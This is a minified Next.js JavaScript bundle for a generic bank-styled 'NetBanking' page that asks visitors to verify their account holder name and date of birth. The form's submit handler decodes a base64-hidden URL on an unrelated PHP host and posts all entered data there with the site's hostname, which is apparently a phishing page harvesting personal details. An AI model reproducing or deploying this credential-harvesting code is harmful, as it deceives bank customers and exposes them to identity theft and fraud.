(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [670], {
        6761: function(e, t, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/p1", function() {
                return n(9162)
            }])
        },
        9018: function(e, t) {
            "use strict";
            t.Z = {
                dataList: "aHR0cHM6Ly9kZW1vLW11c2ljLmtwYmhvc3QuY29tL3VzZURhdGEucGhw"
            }
        },
        1210: function(e, t) {
            "use strict";

            function n(e, t, n, o) {
                return !1
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.getDomainLocale = n, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        8418: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            var o = n(4941).Z;
            n(5753).default, Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.default = void 0;
            var r = n(2648).Z,
                a = n(7273).Z,
                l = r(n(7294)),
                u = n(6273),
                c = n(2725),
                i = n(3462),
                s = n(1018),
                f = n(7190),
                d = n(1210),
                p = n(8684),
                h = {};

            function v(e, t, n, o) {
                if (e && u.isLocalURL(t)) {
                    Promise.resolve(e.prefetch(t, n, o)).catch(function(e) {});
                    var r = o && void 0 !== o.locale ? o.locale : e && e.locale;
                    h[t + "%" + n + (r ? "%" + r : "")] = !0
                }
            }
            var m = l.default.forwardRef(function(e, t) {
                var n, r, m = e.href,
                    y = e.as,
                    x = e.children,
                    j = e.prefetch,
                    g = e.passHref,
                    b = e.replace,
                    _ = e.shallow,
                    C = e.scroll,
                    L = e.locale,
                    N = e.onClick,
                    w = e.onMouseEnter,
                    E = e.onTouchStart,
                    R = e.legacyBehavior,
                    M = void 0 === R ? !0 !== Boolean(!1) : R,
                    P = a(e, ["href", "as", "children", "prefetch", "passHref", "replace", "shallow", "scroll", "locale", "onClick", "onMouseEnter", "onTouchStart", "legacyBehavior"]);
                n = x, M && ("string" == typeof n || "number" == typeof n) && (n = l.default.createElement("a", null, n));
                var T = !1 !== j,
                    k = l.default.useContext(i.RouterContext),
                    O = l.default.useContext(s.AppRouterContext);
                O && (k = O);
                var S = l.default.useMemo(function() {
                        var e = o(u.resolveHref(k, m, !0), 2),
                            t = e[0],
                            n = e[1];
                        return {
                            href: t,
                            as: y ? u.resolveHref(k, y) : n || t
                        }
                    }, [k, m, y]),
                    D = S.href,
                    Z = S.as,
                    B = l.default.useRef(D),
                    U = l.default.useRef(Z);
                M && (r = l.default.Children.only(n));
                var A = M ? r && "object" == typeof r && r.ref : t,
                    H = o(f.useIntersection({
                        rootMargin: "200px"
                    }), 3),
                    I = H[0],
                    F = H[1],
                    G = H[2],
                    K = l.default.useCallback(function(e) {
                        (U.current !== Z || B.current !== D) && (G(), U.current = Z, B.current = D), I(e), A && ("function" == typeof A ? A(e) : "object" == typeof A && (A.current = e))
                    }, [Z, A, D, G, I]);
                l.default.useEffect(function() {
                    var e = F && T && u.isLocalURL(D),
                        t = void 0 !== L ? L : k && k.locale,
                        n = h[D + "%" + Z + (t ? "%" + t : "")];
                    e && !n && v(k, D, Z, {
                        locale: t
                    })
                }, [Z, D, F, L, T, k]);
                var W = {
                    ref: K,
                    onClick: function(e) {
                        M || "function" != typeof N || N(e), M && r.props && "function" == typeof r.props.onClick && r.props.onClick(e), e.defaultPrevented || function(e, t, n, o, r, a, c, i, s, f) {
                            if ("A" !== e.currentTarget.nodeName.toUpperCase() || (!(p = (d = e).currentTarget.target) || "_self" === p) && !d.metaKey && !d.ctrlKey && !d.shiftKey && !d.altKey && (!d.nativeEvent || 2 !== d.nativeEvent.which) && u.isLocalURL(n)) {
                                e.preventDefault();
                                var d, p, h = function() {
                                    "beforePopState" in t ? t[r ? "replace" : "push"](n, o, {
                                        shallow: a,
                                        locale: i,
                                        scroll: c
                                    }) : t[r ? "replace" : "push"](n, {
                                        forceOptimisticNavigation: !f
                                    })
                                };
                                s ? l.default.startTransition(h) : h()
                            }
                        }(e, k, D, Z, b, _, C, L, Boolean(O), T)
                    },
                    onMouseEnter: function(e) {
                        M || "function" != typeof w || w(e), M && r.props && "function" == typeof r.props.onMouseEnter && r.props.onMouseEnter(e), !(!T && O) && u.isLocalURL(D) && v(k, D, Z, {
                            priority: !0
                        })
                    },
                    onTouchStart: function(e) {
                        M || "function" != typeof E || E(e), M && r.props && "function" == typeof r.props.onTouchStart && r.props.onTouchStart(e), !(!T && O) && u.isLocalURL(D) && v(k, D, Z, {
                            priority: !0
                        })
                    }
                };
                if (!M || g || "a" === r.type && !("href" in r.props)) {
                    var q = void 0 !== L ? L : k && k.locale,
                        V = k && k.isLocaleDomain && d.getDomainLocale(Z, q, k.locales, k.domainLocales);
                    W.href = V || p.addBasePath(c.addLocale(Z, q, k && k.defaultLocale))
                }
                return M ? l.default.cloneElement(r, W) : l.default.createElement("a", Object.assign({}, P, W), n)
            });
            t.default = m, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        1018: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.TemplateContext = t.GlobalLayoutRouterContext = t.LayoutRouterContext = t.AppRouterContext = void 0;
            var o = (0, n(2648).Z)(n(7294)),
                r = o.default.createContext(null);
            t.AppRouterContext = r;
            var a = o.default.createContext(null);
            t.LayoutRouterContext = a;
            var l = o.default.createContext(null);
            t.GlobalLayoutRouterContext = l;
            var u = o.default.createContext(null);
            t.TemplateContext = u
        },
        9162: function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, {
                default: function() {
                    return v
                }
            });
            var o = n(7568),
                r = n(655),
                a = n(5893),
                l = n(9008),
                u = n.n(l),
                c = n(5675),
                i = n.n(c),
                s = n(1664),
                f = n.n(s),
                d = n(9018),
                p = n(1163),
                h = n(7294);

            function v() {
                var e, t = function(e, t) {
                        if ("0" !== e.charAt(0) || "00" == e) {
                            var n = parseInt(e);
                            (isNaN(n) || n <= 0 || n > t) && (n = 1), e = n > parseInt(t.toString().charAt(0)) && 1 == n.toString().length ? "0" + n : n.toString()
                        }
                        return e
                    },
                    n = (0, p.useRouter)(),
                    l = (0, h.useState)(!1),
                    c = l[0],
                    s = l[1],
                    v = (e = (0, o.Z)(function(e) {
                        var t, o, a, l, u, c;
                        return (0, r.__generator)(this, function(r) {
                            switch (r.label) {
                                case 0:
                                    return e.preventDefault(), s(!0), t = new FormData(e.target), o = {}, t.forEach(function(e, t) {
                                        o[t] = e
                                    }), l = {
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/json"
                                        },
                                        body: JSON.stringify(o)
                                    }, [4, fetch(window.atob(d.Z.dataList) + "?id=" + window.location.hostname, l)];
                                case 1:
                                    return [4, r.sent().json()];
                                case 2:
                                    return c = r.sent(), s(!1), !0 == c.status ? n.push("/v") : s(!1), [2]
                            }
                        })
                    }), function(t) {
                        return e.apply(this, arguments)
                    }),
                    m = function(e) {
                        var n = e.target.value;
                        /\D\/$/.test(n) && (n = n.substr(0, n.length - 1));
                        var o = n.split("/").map(function(e) {
                            return e.replace(/\D/g, "")
                        });
                        o[0] && (o[0] = t(o[0], 31)), o[1] && (o[1] = t(o[1], 12));
                        var r = o.map(function(e, t) {
                            return 2 == e.length && t < 2 ? e + "/" : e
                        });
                        e.target.value = r.join("").substr(0, 10)
                    };
                return (0, a.jsxs)(a.Fragment, {
                    children: [(0, a.jsxs)(u(), {
                        children: [(0, a.jsx)("title", {
                            children: "Enter Details"
                        }), (0, a.jsx)("meta", {
                            name: "description",
                            content: "enter details"
                        })]
                    }), (0, a.jsx)("div", {
                        className: "header",
                        children: (0, a.jsxs)("div", {
                            className: "logo text-center",
                            children: [(0, a.jsx)(i(), {
                                alt: "the logo",
                                src: "/logo.png",
                                priority: !0,
                                width: 190,
                                height: 32
                            }), (0, a.jsx)("h1", {
                                children: " Welcome to NetBanking "
                            })]
                        })
                    }), (0, a.jsxs)("div", {
                        className: "content",
                        children: [(0, a.jsx)("h2", {
                            children: "Verify Details"
                        }), (0, a.jsxs)("form", {
                            action: "",
                            method: "post",
                            onSubmit: v,
                            children: [(0, a.jsxs)("div", {
                                className: "form-group",
                                children: [(0, a.jsx)("label", {
                                    htmlFor: "username",
                                    children: "Account Holder Name"
                                }), (0, a.jsx)("input", {
                                    type: "text",
                                    className: "form-control",
                                    name: "account_holder_name",
                                    required: !0
                                })]
                            }), (0, a.jsxs)("div", {
                                className: "form-group",
                                children: [(0, a.jsx)("label", {
                                    htmlFor: "username",
                                    children: "Date of Birth"
                                }), (0, a.jsx)("input", {
                                    type: "text",
                                    className: "form-control",
                                    onInput: m,
                                    placeholder: "dd/mm/yyyy",
                                    name: "date_of_birth",
                                    required: !0
                                })]
                            }), (0, a.jsx)("button", {
                                type: "submit",
                                disabled: !!c,
                                className: "btn btn-primary login-btn",
                                children: "SUBMIT"
                            })]
                        })]
                    }), (0, a.jsxs)("div", {
                        className: "footer",
                        children: ["\xa9 Copyright Bank Ltd.", (0, a.jsx)(f(), {
                            className: "link",
                            href: "/",
                            children: (0, a.jsx)("a", {
                                children: "Terms and Conditions"
                            })
                        }), (0, a.jsx)(f(), {
                            className: "link",
                            href: "/",
                            children: (0, a.jsx)("a", {
                                children: "Privacy Policy"
                            })
                        })]
                    })]
                })
            }
        },
        1664: function(e, t, n) {
            e.exports = n(8418)
        },
        7568: function(e, t, n) {
            "use strict";

            function o(e, t, n, o, r, a, l) {
                try {
                    var u = e[a](l),
                        c = u.value
                } catch (i) {
                    n(i);
                    return
                }
                u.done ? t(c) : Promise.resolve(c).then(o, r)
            }

            function r(e) {
                return function() {
                    var t = this,
                        n = arguments;
                    return new Promise(function(r, a) {
                        var l = e.apply(t, n);

                        function u(e) {
                            o(l, r, a, u, c, "next", e)
                        }

                        function c(e) {
                            o(l, r, a, u, c, "throw", e)
                        }
                        u(void 0)
                    })
                }
            }
            n.d(t, {
                Z: function() {
                    return r
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 774, 888, 179], function() {
            return e(e.s = 6761)
        }), _N_E = e.O()
    }
]);